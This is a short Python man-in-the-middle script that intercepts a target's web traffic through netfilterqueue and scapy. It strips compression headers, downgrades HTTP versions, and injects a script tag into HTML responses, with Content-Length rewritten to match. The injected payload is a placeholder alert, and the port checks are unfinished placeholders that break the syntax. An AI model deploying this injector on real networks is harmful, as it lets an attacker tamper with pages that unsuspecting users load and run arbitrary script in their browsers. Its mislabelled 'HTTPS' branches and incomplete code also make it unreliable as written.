#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    """Modify downloads files on the fly while target uses HTTP/HTTPS.
    Do not forget to choose the port you will use on line 23 and line 29 and uncomment the lines."""
    scapy_packet = scapy.IP (packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        #try:
                                           #.decode() in load
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == #CHOOSE PORT HERE: 80 / 10000:
            print("HTTPS Request")
            # print(scapy_packet.show())
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")

        elif scapy_packet[scapy.TCP].sport == #CHOOSE PORT HERE: 80 / 10000:
            print("HTTPS Response")
            #print(scapy_packet.show())
            injection_code = '<script>alert("test");</script>'
            load = load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    #except UnicodeDecodeError:
    #   pass
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
